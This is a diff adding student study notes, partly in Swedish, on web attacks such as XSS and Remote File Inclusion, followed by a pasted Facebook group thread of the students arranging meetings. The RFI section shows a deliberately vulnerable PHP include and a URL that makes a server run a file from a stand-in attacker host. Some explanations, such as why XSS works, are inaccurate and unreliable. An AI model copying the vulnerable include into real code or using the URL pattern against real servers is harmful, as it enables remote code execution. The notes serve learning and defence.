@@ -11,9 +11,182 @@ Name: XSS
 
 Description:
 
-Prevention: 
+The idea is to run your code on a webpage. It exploits the fact that there is a distinction between back and front end. So, even if the manipulation is done in the graphical interface (front end) it can still effect the back end (servers and such). A majority (84%?) of web security holes are XSS.
+
+The attack is generally divided into two categories:
+
+1.non-persistent
+
+Many web pages have search fields. If the implementations is not safe one could inject code. For example:
+
+
+Would direct you to a page saying " could not be found” But also display a new window saying “HEJSAN”.
+
+More malicious code could be retrieving scripts from other sources and stealing cookies.
+
+
+2.persistent
+
+Same idea as for non-persistent but more permanent. Say you have a online forum with users and a user info page. Say there is a field “Favourite sports” and you write “ Soccer ”. Everyone visiting the page will see only “Soccer”, but the script will run and you will also get a new window saying “HEJSAN”. This is due to the fact that scripts are ment for the back end, and will not be presented in the front end.
+
+Prevention:
+
+Knyt cookies till användarens IP.
+Sanera HTML inputs.
+Avaktivera javascript
+Omdirigera felaktiga sökningar.
+Leta efter simultana inloggningar.
 
 Implementation:
+
+sew description for now.
+
+ 
+
+
+
+Name: CSRF
+
+Description:
+
+Prevention:
+
+Implementation:
+
+
+
+Name: SQLInjection
+
+Description:
+
+Prevention:
+
+Implementation:
+
+
+
+Name: Remote File Inclusion
+
+Description: Remote File Inclusion är en attack som utnyttjar möjligheten att i webbaserade scriptspråk (så som php) att exekvera sin egen scriptkod på någon annans server. Om lyckad så tillåter det den som attackerar att få tillgång till hela serverns innehåll samt rättigheter att ändra åtkomsträttigheter etc. Om det inte är så att inställningarna förhindrar det på webbservern.
+
+Prevention: Det går att förhindra genom att inte ha allow_url_fopen och allow_url_include påslagna i php.ini filen beroende på vilken version av php man kör.
+
+Implementation:
+Exmepel på implementering.
+PHP kod:  include($_GET["sida"] . '.html');
+
+
+http://server.se/vulnerablepage.php?sida=nyheter
+
+När du gå in på server.se så öppnas och körs nyheter.html på server.se
+
+http://server.se/vulnerablepage.php?sida=http://attackerarens-server.se/virus.txt?
+
+
+
+istället för att öppna den lokala filen virus.txt så körs det från attackerarens-server.se på server.se
+
+
+--------------------------------------------------
+
+Offline Attacks
+
+--------------------------------------------------
+
+
+
+Name: TMTO
+
+Description:
+
+Prevention:
+
+Implementation:
+Like   Comment
+
+    Seen by everyone
+    Comments
+    David Andersson
+    Write a comment...
+
+OLDER
+Hampus Balldin
+September 16 at 3:30pm
+
+Kevin Ispiroglu, tror att du måste "lägga till oss" för att vi ska kunna pusha till ditt repo.
+Like   Comment
+
+    Seen by everyone
+    Comments
+    View 8 more comments
+
+Gustaf Ekenstein Nej vi satt bara en liten stund idag. Måndag 8-10 tänkte vi ses. Kan du då?
+Like · Reply · September 16 at 4:58pm
+Kevin Ispiroglu Det ska jag nog kunna, har labb vi 10, så kanske får gå lite tidigare smile emoticon
+Like · Reply · September 16 at 4:58pm
+
+    Gustaf Ekenstein Bra! Vi tänkte läsa på och skriva lite om attackerna tills dess. Du får RFI. Vad attacken gör, hur den implementeras, och hur man kan försvara sig.
+    Like · Reply · September 16 at 4:59pm
+    David Andersson
+    Write a comment...
+
+Gustaf Ekenstein
+September 16 at 2:39pm
+
+Ses vi kl 15?
+Like   Comment
+
+    Seen by everyone
+    Comments
+
+Kevin Ispiroglu Har föreläsning då
+Like · Reply · September 16 at 2:47pm
+Hampus Balldin Är i E-husets entré!
+Like · Reply · September 16 at 3:03pm
+
+    Gustaf Ekenstein Kommer dit!
+    Like · Reply · September 16 at 3:03pm
+    David Andersson
+    Write a comment...
+
+Kevin Ispiroglu
+September 14 at 9:04am
+
+När kan ni ses i veckan?
+Like   Comment
+
+    Seen by everyone
+    Comments
+    View 8 more comments
+
+Hampus Balldin Japp
+Like · Reply · September 14 at 3:10pm
+Gustaf Ekenstein Vi sätter oss i varg
+Like · Reply · September 14 at 3:12pm
+
+    Kevin Ispiroglu git@github.com:abt09kis/EITF05.git
+    See Translation
+    Build software better, together
+    GitHub is where people build software. More than 10 million people use GitHub to discover, fork, and...
+    github.com
+    Like · Reply · Remove Preview · 1 · September 14 at 4:09pm
+    David Andersson
+    Write a comment...
+
+David Andersson
+September 8 at 4:05pm
+
+Hejsan! När kan ni ses? Förslag på Torsdag eftermiddag eller Fredag finns. Det tiderna fungerar bra för mig med!
+Like   Comment
+
+    Seen by everyone
+    Comments
+    View 11 more comments
+
+Hampus Balldin Imorgon helt fullt. Kan fredag från och med kl. 12.00!
+September 9 at 12:52pm · Like
+David Andersson Låter som om vi får skjuta på det till nästa vecka?
+September 9 at 12:54pm · Like
 
 
 
